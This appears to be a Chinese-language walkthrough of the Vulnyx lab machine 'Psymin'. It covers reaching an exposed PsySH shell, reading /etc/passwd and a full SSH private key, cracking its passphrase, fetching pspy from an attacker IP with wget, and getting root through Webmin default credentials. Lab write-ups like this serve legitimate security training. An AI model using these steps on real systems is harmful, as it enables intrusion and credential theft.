---
title: Psymin
author: hgbe02
date: 2024-09-07 18:05:38 +0800
categories: [Training platform,Vulnyx]
tags: [Web,Vulnyx]
permalink: "/Vulnyx/Psymin.html"
---

##  (°ー°〃)Psymin

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071809405.png" alt="image-20240907164217493" style="zoom:33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071809407.png" alt="image-20240907172727198" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/temp/Psymin]
└─$ rustscan -a $IP -- -sCV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.10.100:22
Open 192.168.10.100:80
Open 192.168.10.100:3000

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzUvGOaZF4gJoYBGR4NrMZOj32x98uVDUQ0dY0RENRdIyokD8RvJG8g9g71aoh/20m4mcEEdSyp+eE9ABu1kwk=
|   256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPrNZ9AQg+cgX4w0wabsDTAVeo9/VWThsF5efc2OzsFo
80/tcp   open  http    syn-ack nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.22.1
|_http-title: Welcome to nginx!
3000/tcp open  ppp?    syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     ^@^L^@^@^P^@^@^@^@^@^@^@^@^@Psy Shell v0.12.4 (PHP 8.2.20 
|     cli) by Justin Hileman
|     OPTIONS / RTSP/1.0
|   DNSVersionBindReqTCP: 
|     ^CPsy Shell v0.12.4 (PHP 8.2.20 
|     cli) by Justin Hileman
|   GenericLines, NULL: 
|     Psy Shell v0.12.4 (PHP 8.2.20 
|     cli) by Justin Hileman
|   GetRequest: 
|     GET / HTTP/1.0
|     Shell v0.12.4 (PHP 8.2.20 
|     cli) by Justin Hileman
|     HTTP/1.0
|     Error Undefined constant "GET".
|   HTTPOptions: 
|     OPTIONS / HTTP/1.0
|     Shell v0.12.4 (PHP 8.2.20 
|     cli) by Justin Hileman
|     OPTIONS / HTTP/1.0
|     Error Undefined constant "OPTIONS".
|   Help: 
|     HELP
|     Shell v0.12.4 (PHP 8.2.20 
|     cli) by Justin Hileman
|     HELP
|     Error Undefined constant "HELP".
|   NCP: 
|     DmdT^@^@^@
|     ^@^@^@^A^@^@^@^@
|   RTSPRequest: 
|     OPTIONS / RTSP/1.0
|     Shell v0.12.4 (PHP 8.2.20 
|     cli) by Justin Hileman
|     OPTIONS / RTSP/1.0
|     Error Undefined constant "OPTIONS".
|   SSLSessionReq: 
|     ^C^A^@Psy Shell v0.12.4 (PHP 8.2.20 
|_    cli) by Justin Hileman
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=9/7%Time=66DC1CBF%P=x86_64-pc-linux-gnu%r(
SF:NULL,3C,"Psy\x20Shell\x20v0\.12\.4\x20\(PHP\x208\.2\.20\x20\xe2\x80\x94
SF:\x20cli\)\x20by\x20Justin\x20Hileman\r\n>\x20")%r(GenericLines,4C,"Psy\
SF:x20Shell\x20v0\.12\.4\x20\(PHP\x208\.2\.20\x20\xe2\x80\x94\x20cli\)\x20
SF:by\x20Justin\x20Hileman\r\n>\x20\r\n>\x20\r\n>\x20\r\n>\x20\r\n>\x20")%
SF:r(GetRequest,99,"GET\x20/\x20HTTP/1\.0\r\n\r\n\r\n\r\nPsy\x20Shell\x20v
SF:0\.12\.4\x20\(PHP\x208\.2\.20\x20\xe2\x80\x94\x20cli\)\x20by\x20Justin\
SF:x20Hileman\r\n>\x20GET\x20/\x20HTTP/1\.0\r\n\r\n\x20\x20\x20Error\x20\x
SF:20Undefined\x20constant\x20\"GET\"\.\r\n\r\n>\x20\r\n>\x20\r\n>\x20\r\n
SF:>\x20")%r(Help,7A,"HELP\r\n\r\nPsy\x20Shell\x20v0\.12\.4\x20\(PHP\x208\
SF:.2\.20\x20\xe2\x80\x94\x20cli\)\x20by\x20Justin\x20Hileman\r\n>\x20HELP
SF:\r\n\r\n\x20\x20\x20Error\x20\x20Undefined\x20constant\x20\"HELP\"\.\r\
SF:n\r\n>\x20\r\n>\x20")%r(NCP,38,"DmdT\^@\^@\^@\x08\x20\x08\x08\x20\x08\x
SF:08\x20\x08\x08\x20\x08\x08\x20\x08\x08\x20\x08\x08\x20\x08\x08\x20\x08\
SF:x08\x20\x08\x08\x20\x08\^@\^@\^@\^A\^@\^@\^@\^@")%r(HTTPOptions,A5,"OPT
SF:IONS\x20/\x20HTTP/1\.0\r\n\r\n\r\n\r\nPsy\x20Shell\x20v0\.12\.4\x20\(PH
SF:P\x208\.2\.20\x20\xe2\x80\x94\x20cli\)\x20by\x20Justin\x20Hileman\r\n>\
SF:x20OPTIONS\x20/\x20HTTP/1\.0\r\n\r\n\x20\x20\x20Error\x20\x20Undefined\
SF:x20constant\x20\"OPTIONS\"\.\r\n\r\n>\x20\r\n>\x20\r\n>\x20\r\n>\x20")%
SF:r(RTSPRequest,A5,"OPTIONS\x20/\x20RTSP/1\.0\r\n\r\n\r\n\r\nPsy\x20Shell
SF:\x20v0\.12\.4\x20\(PHP\x208\.2\.20\x20\xe2\x80\x94\x20cli\)\x20by\x20Ju
SF:stin\x20Hileman\r\n>\x20OPTIONS\x20/\x20RTSP/1\.0\r\n\r\n\x20\x20\x20Er
SF:ror\x20\x20Undefined\x20constant\x20\"OPTIONS\"\.\r\n\r\n>\x20\r\n>\x20
SF:\r\n>\x20\r\n>\x20")%r(DNSVersionBindReqTCP,3E,"\^CPsy\x20Shell\x20v0\.
SF:12\.4\x20\(PHP\x208\.2\.20\x20\xe2\x80\x94\x20cli\)\x20by\x20Justin\x20
SF:Hileman\r\n>\x20")%r(DNSStatusRequestTCP,74,"\^@\^L\^@\^@\^P\^@\^@\^@\^
SF:@\^@\^@\^@\^@\^@Psy\x20Shell\x20v0\.12\.4\x20\(PHP\x208\.2\.20\x20\xe2\
SF:x80\x94\x20cli\)\x20by\x20Justin\x20Hileman\r\n>\x20\^L\x07\r>\x20OPTIO
SF:NS\x20/\x20RTSP/1\.0\x07\x07\x07\x07")%r(SSLSessionReq,42,"\^C\^A\^@Psy
SF:\x20Shell\x20v0\.12\.4\x20\(PHP\x208\.2\.20\x20\xe2\x80\x94\x20cli\)\x2
SF:0by\x20Justin\x20Hileman\r\n>\x20");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```bash
┌──(kali💀kali)-[~/temp/Psymin]
└─$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -b 301,401,403,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.100
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   301,401,403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 96152 / 441122 (21.80%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 96440 / 441122 (21.86%)
===============================================================
Finished
===============================================================
```

## 漏洞发现

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071809408.png" alt="image-20240907173123267" style="zoom:50%;" />

### 敏感端口测试

尝试连接一下3000端口，尝试进行测试：https://github.com/bobthecow/psysh/wiki/Commands

```bash
┌──(kali💀kali)-[~/temp/Psymin]
└─$ nc $IP 3000
Psy Shell v0.12.4 (PHP 8.2.20 — cli) by Justin Hileman
> $a = $b = 'c'                                   
$a = $b = 'c'
WARNING: terminal is not fully functional
Press RETURN to continue 

= "c"

> ls -la
ls -la
WARNING: terminal is not fully functional
Press RETURN to continue 


Variables:
  $a   "c"  
  $b   "c"  
  $_   "c"
```

尝试执行相关命令，读取文件：

```bash
> echo file_get_contents("/etc/passwd")
echo file_get_contents("/etc/passwd")
WARNING: terminal is not fully functional
Press RETURN to continue 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
alfred:x:1000:1000:alfred:/home/alfred:/bin/bash
```

### 利用私钥登录

尝试读取ssh的私钥：

```bash
> echo file_get_contents("/home/alfred/.ssh/id_rsa")
echo file_get_contents("/home/alfred/.ssh/id_rsa")
WARNING: terminal is not fully functional
Press RETURN to continue 

-----BEGIN OPENSSH PRIVATE KEY-----
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
mqXDfQ==
-----END OPENSSH PRIVATE KEY-----
```

利用私钥进行登录：

```bash
┌──(kali💀kali)-[~/temp/Psymin]
└─$ vim alfred

┌──(kali💀kali)-[~/temp/Psymin]
└─$ chmod 600 alfred 

┌──(kali💀kali)-[~/temp/Psymin]
└─$ ssh -i alfred alfred@$IP       
The authenticity of host '192.168.10.100 (192.168.10.100)' can't be established.
ED25519 key fingerprint is SHA256:4K6G5c0oerBJXgd6BnT2Q3J+i/dOR4+6rQZf20TIk/U.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.10.100' (ED25519) to the list of known hosts.
Enter passphrase for key 'alfred':
```

发现存在密码，尝试进行爆破：

```bash
┌──(kali💀kali)-[~/temp/Psymin]
└─$ ssh2john alfred > hash                                                                              

┌──(kali💀kali)-[~/temp/Psymin]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash     
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alfredo          (alfred)     
1g 0:00:00:58 DONE (2024-09-07 05:43) 0.01698g/s 15.21p/s 15.21c/s 15.21C/s molly..ilovegod
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

尝试进行登录：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071809409.png" alt="image-20240907174410961" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
alfred@psymin:~$ sudo -l
-bash: sudo: orden no encontrada
alfred@psymin:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/mount
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
alfred@psymin:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
alfred@psymin:~$ ss -tulnp
Netid           State            Recv-Q           Send-Q                     Local Address:Port                        Peer Address:Port           Process                                   
udp             UNCONN           0                0                                0.0.0.0:68                               0.0.0.0:*                                                        
udp             UNCONN           0                0                                0.0.0.0:10000                            0.0.0.0:*                                                        
tcp             LISTEN           0                128                              0.0.0.0:22                               0.0.0.0:*                                                        
tcp             LISTEN           0                511                              0.0.0.0:80                               0.0.0.0:*                                                        
tcp             LISTEN           0                5                                0.0.0.0:3000                             0.0.0.0:*               users:(("socat",pid=466,fd=5))           
tcp             LISTEN           0                4096                           127.0.0.1:10000                            0.0.0.0:*                                                        
tcp             LISTEN           0                128                                 [::]:22                                  [::]:*                                                        
tcp             LISTEN           0                511                                 [::]:80                                  [::]:*            
alfred@psymin:~$ curl 0.0.0.0 1000
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```

尝试上传`pspy64`进行监听：

```bash
alfred@psymin:~$ cd /tmp
alfred@psymin:/tmp$ wget http://192.168.10.102:8888/lpspy64
alfred@psymin:/tmp$ chmod +x lpspy64 
alfred@psymin:/tmp$ ./lpspy64
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071809410.png" alt="image-20240907175116755" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071809411.png" alt="image-20240907175127477" style="zoom:50%;" />

发现root在执行某个进程，看一下：

```bash
alfred@psymin:/tmp$ cat /usr/share/webmin/webmincron/webmincron.pl
#!/usr/bin/perl
# Wrapper to run a single function via webmin cron

$main::no_acl_check = 1;
$main::no_referers_check = 1;
$main::webmin_script_type = 'cron';
do './webmincron-lib.pl';
$cron = $ARGV[0];

# Build list of args
my @args;
for(my $i=0; defined($cron->{'arg'.$i}); $i++) {
        push(@args, $cron->{'arg'.$i});
        }

# Force webmin script type to be cron
$main::webmin_script_type = 'cron';
$main::webmin_script_webmincron = $cron->{'module'}."::".$cron->{'func'};

# Require the module, call the function
eval {
        local $main::error_must_die = 1;
        &foreign_require($cron->{'module'}, $cron->{'file'});
        &foreign_call($cron->{'module'}, $cron->{'func'}, @args);
        };
$log = { %$cron };
if ($@) {
        $log->{'error'} = $@;
        }

# Log it, if enabled
if ($gconfig{'logsched'}) {
        &webmin_log("run", "webmincron", $cron->{'id'}, $log);
        }
```

进一步查看：

```bash
alfred@psymin:/tmp$ find / -name webmin 2>/dev/null
/etc/webmin
/etc/webmin/webmin
/etc/pam.d/webmin
/usr/bin/webmin
/usr/share/webmin
/usr/share/webmin/webmin
/usr/share/webmin/bin/webmin
/usr/share/webmin/gray-theme/webmin
/usr/share/webmin/gray-theme/images/favicons/webmin
/usr/share/webmin/authentic-theme/images/modules/webmin
/usr/share/webmin/authentic-theme/images/favicons/webmin
/usr/share/doc/webmin
/var/webmin
```

### 弱密码登录

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071809412.png" alt="image-20240907175811045" style="zoom: 50%;" />

尝试转发10000端口：

```bash
alfred@psymin:~$ socat TCP-LISTEN:10001,fork TCP4:127.0.0.1:10000&
[1] 1702
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071809413.png" alt="image-20240907180328848" style="zoom:50%;" />

尝试默认用户密码：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071809414.png" alt="image-20240907180605845" style="zoom:33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071809415.png" alt="image-20240907180615085" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071809416.png" alt="image-20240907180634589" style="zoom:50%;" />

登录成功，尝试执行相关命令！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071809417.png" alt="image-20240907180726055" style="zoom:50%;" />

把shell弹回来：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071809418.png" alt="image-20240907180828979" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409071809419.png" alt="image-20240907180842454" style="zoom: 33%;" />

成功！

